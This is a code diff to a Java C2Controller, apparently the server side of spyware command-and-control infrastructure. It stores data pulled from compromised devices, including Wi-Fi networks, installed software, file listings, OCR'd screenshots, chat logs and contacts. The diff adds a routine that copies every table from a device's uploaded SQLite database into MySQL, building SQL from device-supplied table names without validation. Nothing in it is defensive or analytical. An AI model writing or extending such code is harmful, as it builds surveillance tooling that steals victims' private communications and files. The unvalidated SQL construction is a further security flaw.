@@ -118,10 +118,10 @@ public class C2Controller {
                     "device_uuid varchar(64) not null, " +
                     "ssid varchar(128) null, " +
                     "bssid varchar(64) null, " +
-                    "signalStrength varchar(32) null, " +
+                    "signal_strength varchar(32) null, " +
                     "authentication varchar(64) null, " +
-                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
-                    "isDelete tinyint default 0 not null)");
+                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
+                    "is_delete tinyint default 0 not null)");
 
             // C2 Software
             jdbcTemplate.execute("create table if not exists c2_software (" +
@@ -129,22 +129,22 @@ public class C2Controller {
                     "device_uuid varchar(64) not null, " +
                     "name varchar(256) null, " +
                     "version varchar(128) null, " +
-                    "installDate varchar(64) null, " +
-                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
-                    "isDelete tinyint default 0 not null)");
+                    "install_date varchar(64) null, " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
+                    "is_delete tinyint default 0 not null)");
 
             // C2 File Scan
             jdbcTemplate.execute("create table if not exists c2_file_scan (" +
                     "id bigint auto_increment primary key, " +
                     "device_uuid varchar(64) not null, " +
-                    "fileName varchar(256) null, " +
-                    "filePath varchar(512) null, " +
-                    "fileSize bigint null, " +
+                    "file_name varchar(256) null, " +
+                    "file_path varchar(512) null, " +
+                    "file_size bigint null, " +
                     "md5 varchar(64) null, " +
-                    "lastModified datetime null, " +
-                    "isRecent tinyint default 0 null, " +
-                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
-                    "isDelete tinyint default 0 not null)");
+                    "last_modified datetime null, " +
+                    "is_recent tinyint default 0 null, " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
+                    "is_delete tinyint default 0 not null)");
             
             // C2 Screenshot
             jdbcTemplate.execute("create table if not exists c2_screenshot (" +
@@ -1140,10 +1140,10 @@ public class C2Controller {
                  });
                  
                  return ResultUtils.success("Scan results uploaded, processing in background");
-             } catch (IOException e) {
-                 log.error("Failed to save scan DB. Target path: " + (dir != null ? dir.getAbsolutePath() : "null"), e);
-                 return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed: " + e.getMessage());
-             }
+            } catch (IOException e) {
+                log.error("Failed to save scan DB. Target path: " + (dir != null ? dir.getAbsolutePath() : "null"), e);
+                return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed (Save DB): " + e.getMessage());
+            }
         }
 
         // Standard file upload
@@ -1167,6 +1167,7 @@ public class C2Controller {
                     c2ScreenshotMapper.insert(screenshot);
                 } catch (Exception e) {
                     log.error("OCR failed for uploaded image: " + filename, e);
+                    // Continue without failing the upload
                 }
             }
 
@@ -1189,8 +1190,11 @@ public class C2Controller {
             
             return ResultUtils.success("File uploaded successfully");
         } catch (IOException e) {
-            log.error("Upload failed", e);
-            return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed");
+            log.error("Upload failed (IO Error)", e);
+            return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed: " + e.getMessage());
+        } catch (Exception e) {
+            log.error("Upload failed (Unknown Error)", e);
+            return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed: " + e.getMessage());
         }
     }
 
@@ -1267,7 +1271,7 @@ public class C2Controller {
                     String redisKey = "dedup:hash:wifi:" + deviceUuid;
                     String lastHash = dedupCache.get(redisKey);
                     
-                    if (lastHash != null && lastHash.equals(currentHash)) {
+                    if (lastHash != null && lastHash.equals(currentHash) && c2WifiMapper.selectCount(new QueryWrapper<C2Wifi>().eq("device_uuid", deviceUuid)) > 0) {
                         log.info("WiFi scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
                     } else {
                         // Update DB
@@ -1653,6 +1657,116 @@ public class C2Controller {
                     log.info("Processed {} files from scan results into C2FileScan and C2FileSystemNode", totalCount);
                 } catch (Exception e) {
                     log.warn("Failed to process file scan results: {}", e.getMessage());
+                }
+
+                // 6. Generic Sync for Other Tables
+                try {
+                    // Get all tables from SQLite
+                    List<String> allTables = new ArrayList<>();
+                    java.sql.ResultSet tablesRs = stmt.executeQuery("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'");
+                    while (tablesRs.next()) {
+                        allTables.add(tablesRs.getString("name"));
+                    }
+                    tablesRs.close();
+                    
+                    // Filter excluded tables
+                    List<String> processedTables = java.util.Arrays.asList(
+                        "system_info", "wifi_scan_results", "installed_software", 
+                        "chat_logs", "current_user", "files", "file_scan_results", 
+                        "contacts", "chat_sync_state", "local_tasks", "android_metadata"
+                    );
+                    
+                    for (String tableName : allTables) {
+                        if (processedTables.contains(tableName)) {
+                            continue;
+                        }
+                        
+                        // Sync this table
+                        log.info("Syncing generic table: {}", tableName);
+                        
+                        // Get columns
+                        List<String> colNames = new ArrayList<>();
+                        List<String> colTypes = new ArrayList<>();
+                        java.sql.ResultSet colsRs = stmt.executeQuery("PRAGMA table_info(" + tableName + ")");
+                        while (colsRs.next()) {
+                            colNames.add(colsRs.getString("name"));
+                            colTypes.add(colsRs.getString("type"));
+                        }
+                        colsRs.close();
+                        
+                        if (colNames.isEmpty()) continue;
+                        
+                        // Create MySQL Table
+                        // Use exact table name (assuming no conflict with system tables or safe context)
+                        StringBuilder createSql = new StringBuilder("CREATE TABLE IF NOT EXISTS `");
+                        createSql.append(tableName).append("` (");
+                        createSql.append("`id` BIGINT AUTO_INCREMENT PRIMARY KEY, ");
+                        createSql.append("`device_uuid` VARCHAR(64) NOT NULL, ");
+                        
+                        for (int i = 0; i < colNames.size(); i++) {
+                            String colName = colNames.get(i);
+                            String colType = colTypes.get(i).toUpperCase();
+                            String mysqlType = "TEXT"; // Default to TEXT
+                            
+                            if (colType.contains("INT")) mysqlType = "BIGINT";
+                            else if (colType.contains("REAL") || colType.contains("FLOAT") || colType.contains("DOUBLE")) mysqlType = "DOUBLE";
+                            else if (colType.contains("BLOB")) mysqlType = "LONGBLOB";
+                            else if (colType.contains("BOOL")) mysqlType = "TINYINT";
+                            
+                            // Escape column name
+                            createSql.append("`").append(colName).append("` ").append(mysqlType).append(", ");
+                        }
+                        createSql.append("`create_time` DATETIME DEFAULT CURRENT_TIMESTAMP");
+                        // Add index on device_uuid for performance
+                        createSql.append(", INDEX `idx_device_uuid` (`device_uuid`)");
+                        createSql.append(")");
+                        
+                        // Execute Create Table
+                        jdbcTemplate.execute(createSql.toString());
+                        
+                        // Delete old data for this device in this table
+                        // Note: This assumes we want to replace all data for this device in this table
+                        jdbcTemplate.update("DELETE FROM `" + tableName + "` WHERE device_uuid = ?", deviceUuid);
+                        
+                        // Insert new data
+                        java.sql.ResultSet dataRs = stmt.executeQuery("SELECT * FROM " + tableName);
+                        
+                        StringBuilder insertSql = new StringBuilder("INSERT INTO `").append(tableName).append("` (device_uuid, ");
+                        for (String col : colNames) insertSql.append("`").append(col).append("`, ");
+                        insertSql.setLength(insertSql.length() - 2); // remove last comma
+                        insertSql.append(") VALUES (?, ");
+                        for (int i = 0; i < colNames.size(); i++) insertSql.append("?, ");
+                        insertSql.setLength(insertSql.length() - 2);
+                        insertSql.append(")");
+                        
+                        List<Object[]> batchArgs = new ArrayList<>();
+                        int batchSize = 1000;
+                        int rowCount = 0;
+                        
+                        while (dataRs.next()) {
+                            Object[] args = new Object[colNames.size() + 1];
+                            args[0] = deviceUuid;
+                            for (int i = 0; i < colNames.size(); i++) {
+                                args[i+1] = dataRs.getObject(colNames.get(i));
+                            }
+                            batchArgs.add(args);
+                            rowCount++;
+                            
+                            if (batchArgs.size() >= batchSize) {
+                                jdbcTemplate.batchUpdate(insertSql.toString(), batchArgs);
+                                batchArgs.clear();
+                            }
+                        }
+                        dataRs.close();
+                        
+                        if (!batchArgs.isEmpty()) {
+                            jdbcTemplate.batchUpdate(insertSql.toString(), batchArgs);
+                        }
+                        log.info("Synced {} rows to table {}", rowCount, tableName);
+                    }
+                    
+                } catch (Exception e) {
+                    log.warn("Failed to process generic sync: {}", e.getMessage());
                 }
             }
             
